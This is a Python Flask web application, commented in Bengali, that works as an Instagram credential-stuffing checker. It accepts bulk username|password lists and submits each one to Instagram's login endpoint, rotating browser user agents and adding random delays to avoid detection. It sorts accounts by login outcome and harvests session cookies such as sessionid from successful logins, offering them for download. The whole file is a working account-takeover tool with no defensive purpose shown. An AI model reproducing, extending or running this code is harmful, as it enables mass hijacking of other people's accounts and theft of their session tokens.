
from flask import Flask, render_template, request, jsonify, send_file
from flask_cors import CORS
import json
import time
import random
from datetime import datetime
import threading
import zipfile
from io import BytesIO
import concurrent.futures
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import re

app = Flask(__name__)
CORS(app)

jobs = {}

class InstagramChecker:
    def __init__(self):
        self.session = self.create_session()
        
    def create_session(self):
        """সেশন তৈরি"""
        session = requests.Session()
        retry = Retry(total=3, backoff_factor=0.5)
        adapter = HTTPAdapter(max_retries=retry)
        session.mount('http://', adapter)
        session.mount('https://', adapter)
        return session
    
    def get_random_headers(self):
        """র‍্যান্ডম হেডার"""
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1'
        ]
        
        return {
            'User-Agent': random.choice(user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9,bn;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Cache-Control': 'max-age=0'
        }
    
    def get_csrf_token(self, html_content):
        """HTML থেকে CSRF টোকেন বের করা"""
        patterns = [
            r'csrf_token":"([^"]+)"',
            r'name="csrf_token" value="([^"]+)"',
            r'csrf_token: "([^"]+)"',
            r'CSRFToken" value="([^"]+)"'
        ]
        
        for pattern in patterns:
            match = re.search(pattern, html_content)
            if match:
                return match.group(1)
        return None
    
    def check_account(self, username, password):
        """একাউন্ট চেক"""
        try:
            headers = self.get_random_headers()
            
            # ১. হোমপেজে যাই (কুকি নিতে)
            home_response = self.session.get(
                'https://www.instagram.com/',
                headers=headers,
                timeout=10
            )
            
            if home_response.status_code != 200:
                return {
                    'status': 'error',
                    'username': username,
                    'error': f'Homepage error: {home_response.status_code}'
                }
            
            # ২. CSRF টোকেন খোঁজা
            csrf_token = None
            for cookie in self.session.cookies:
                if cookie.name == 'csrftoken':
                    csrf_token = cookie.value
                    break
            
            if not csrf_token:
                csrf_token = self.get_csrf_token(home_response.text)
            
            if not csrf_token:
                return {
                    'status': 'error',
                    'username': username,
                    'error': 'CSRF token not found'
                }
            
            # ৩. র‍্যান্ডম ডেলay
            time.sleep(random.uniform(1, 3))
            
            # ৪. লগিন হেডার
            login_headers = {
                'User-Agent': headers['User-Agent'],
                'Accept': '*/*',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br',
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-CSRFToken': csrf_token,
                'X-Instagram-AJAX': str(random.randint(1000000, 9999999)),
                'X-Requested-With': 'XMLHttpRequest',
                'Origin': 'https://www.instagram.com',
                'Connection': 'keep-alive',
                'Referer': 'https://www.instagram.com/',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin'
            }
            
            # ৫. লগিন ডাটা
            login_data = {
                'username': username,
                'password': password,
                'queryParams': '{}',
                'optIntoOneTap': 'false',
                'stopDeletionNonce': '',
                'trustedDeviceRecords': '{}'
            }
            
            # ৬. লগিন রিকোয়েস্ট
            login_response = self.session.post(
                'https://www.instagram.com/api/v1/web/accounts/login/ajax/',
                data=login_data,
                headers=login_headers,
                timeout=10,
                allow_redirects=False
            )
            
            # ৭. রেসপন্স চেক
            if login_response.status_code == 200:
                response_text = login_response.text
                
                # JSON পার্স করার চেষ্টা
                try:
                    result = json.loads(response_text)
                except json.JSONDecodeError:
                    # JSON না পেলে, HTML থেকে JSON খোঁজা
                    json_match = re.search(r'\{.*\}', response_text, re.DOTALL)
                    if json_match:
                        try:
                            result = json.loads(json_match.group())
                        except:
                            result = {}
                    else:
                        result = {}
                
                # রেজাল্ট চেক
                if result.get('authenticated'):
                    # কুকি সংগ্রহ
                    cookies = self.session.cookies.get_dict()
                    cookie_parts = []
                    for key in ['sessionid', 'csrftoken', 'ds_user_id', 'rur']:
                        if key in cookies:
                            cookie_parts.append(f"{key}={cookies[key]}")
                    
                    return {
                        'status': 'good',
                        'username': username,
                        'cookie': '; '.join(cookie_parts)
                    }
                
                elif result.get('two_factor_required') or result.get('two_factor_info'):
                    return {
                        'status': '2fa',
                        'username': username
                    }
                
                elif result.get('checkpoint_url') or result.get('checkpoint'):
                    return {
                        'status': 'challenge',
                        'username': username
                    }
                
                elif 'message' in result and 'password' in str(result).lower():
                    return {
                        'status': 'bad',
                        'username': username
                    }
                
                else:
                    return {
                        'status': 'unknown',
                        'username': username,
                        'response': str(result)[:100]
                    }
            
            elif login_response.status_code == 400:
                return {
                    'status': 'bad',
                    'username': username
                }
            
            elif login_response.status_code == 429:
                return {
                    'status': 'rate_limit',
                    'username': username
                }
            
            else:
                return {
                    'status': 'error',
                    'username': username,
                    'error': f'HTTP {login_response.status_code}'
                }
                
        except requests.exceptions.Timeout:
            return {
                'status': 'timeout',
                'username': username
            }
        except requests.exceptions.ConnectionError:
            return {
                'status': 'connection_error',
                'username': username
            }
        except Exception as e:
            return {
                'status': 'error',
                'username': username,
                'error': str(e)[:100]
            }

def process_accounts(credentials_list, job_id):
    """একাউন্ট প্রসেস"""
    total = len(credentials_list)
    
    jobs[job_id]['progress'] = 0
    jobs[job_id]['status'] = 'processing'
    
    completed = 0
    
    for cred in credentials_list:
        if '|' not in cred:
            completed += 1
            continue
            
        username, password = cred.split('|', 1)
        username = username.strip()
        password = password.strip()
        
        try:
            checker = InstagramChecker()
            result = checker.check_account(username, password)
            
            if result['status'] == 'good':
                jobs[job_id]['results']['good'].append(f"{username}|{result.get('cookie', '')}")
            elif result['status'] == '2fa':
                jobs[job_id]['results']['2fa'].append(f"{username}|2FA_REQUIRED")
            elif result['status'] == 'challenge':
                jobs[job_id]['results']['challenge'].append(f"{username}|CHALLENGE_REQUIRED")
            elif result['status'] == 'bad':
                jobs[job_id]['results']['bad'].append(f"{username}|BAD_PASSWORD")
            elif result['status'] == 'rate_limit':
                jobs[job_id]['results']['error'].append(f"{username}|RATE_LIMITED")
            elif result['status'] == 'timeout':
                jobs[job_id]['results']['error'].append(f"{username}|TIMEOUT")
            elif result['status'] == 'connection_error':
                jobs[job_id]['results']['error'].append(f"{username}|CONNECTION_ERROR")
            else:
                jobs[job_id]['results']['error'].append(f"{username}|ERROR: {result.get('error', 'Unknown')}")
                
        except Exception as e:
            jobs[job_id]['results']['error'].append(f"{username}|ERROR: {str(e)[:100]}")
        
        completed += 1
        jobs[job_id]['progress'] = int(completed / total * 100)
        jobs[job_id]['details'] = {
            'good': len(jobs[job_id]['results']['good']),
            '2fa': len(jobs[job_id]['results']['2fa']),
            'challenge': len(jobs[job_id]['results']['challenge']),
            'bad': len(jobs[job_id]['results']['bad']),
            'error': len(jobs[job_id]['results']['error'])
        }
        
        # ২ সেকেন্ড বিরতি (রেট লিমিট এড়াতে)
        if completed < total:
            time.sleep(2)
    
    jobs[job_id]['status'] = 'completed'

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/submit', methods=['POST'])
def submit():
    try:
        data = request.json
        credentials = data.get('credentials', '').strip().split('\n')
        credentials = [c.strip() for c in credentials if c.strip()]
        
        if not credentials:
            return jsonify({'error': 'কোনো ডাটা দেওয়া হয়নি'}), 400
        
        job_id = datetime.now().strftime("%Y%m%d%H%M%S")
        jobs[job_id] = {
            'status': 'pending',
            'progress': 0,
            'results': {'good': [], '2fa': [], 'challenge': [], 'bad': [], 'error': []},
            'details': {},
            'total': len(credentials)
        }
        
        thread = threading.Thread(target=process_accounts, args=(credentials, job_id))
        thread.daemon = True
        thread.start()
        
        return jsonify({'job_id': job_id})
    
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/status/<job_id>')
def status(job_id):
    if job_id not in jobs:
        return jsonify({'error': 'Job not found'}), 404
    return jsonify({
        'status': jobs[job_id]['status'],
        'progress': jobs[job_id]['progress'],
        'details': jobs[job_id].get('details', {}),
        'total': jobs[job_id]['total']
    })

@app.route('/api/download/<job_id>/<type>')
def download(job_id, type):
    try:
        if job_id not in jobs:
            return jsonify({'error': 'Job not found'}), 404
        
        if type == 'all':
            memory_file = BytesIO()
            with zipfile.ZipFile(memory_file, 'w') as zf:
                for category in ['good', '2fa', 'challenge', 'bad', 'error']:
                    results = jobs[job_id]['results'][category]
                    if results:
                        content = '\n'.join(results)
                        zf.writestr(f"{category}_accounts.txt", content)
                
                report = f"""Instagram Checker Report
Job ID: {job_id}
Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
Total Accounts: {jobs[job_id]['total']}

Results:
✅ Good: {len(jobs[job_id]['results']['good'])}
🔐 2FA: {len(jobs[job_id]['results']['2fa'])}
⚠️ Challenge: {len(jobs[job_id]['results']['challenge'])}
❌ Bad Password: {len(jobs[job_id]['results']['bad'])}
❗ Errors: {len(jobs[job_id]['results']['error'])}
"""
                zf.writestr("report.txt", report)
            
            memory_file.seek(0)
            return send_file(memory_file, download_name=f'all_results_{job_id}.zip', as_attachment=True)
        
        else:
            results = jobs[job_id]['results'][type]
            if not results:
                return jsonify({'error': 'No results'}), 404
            content = '\n'.join(results)
            return send_file(
                BytesIO(content.encode('utf-8')),
                download_name=f'{type}_{job_id}.txt',
                as_attachment=True
            )
    
    except Exception as e:
        return jsonify({'error': str(e)}), 500

if __name__ == '__main__':
    app.run(debug=True)
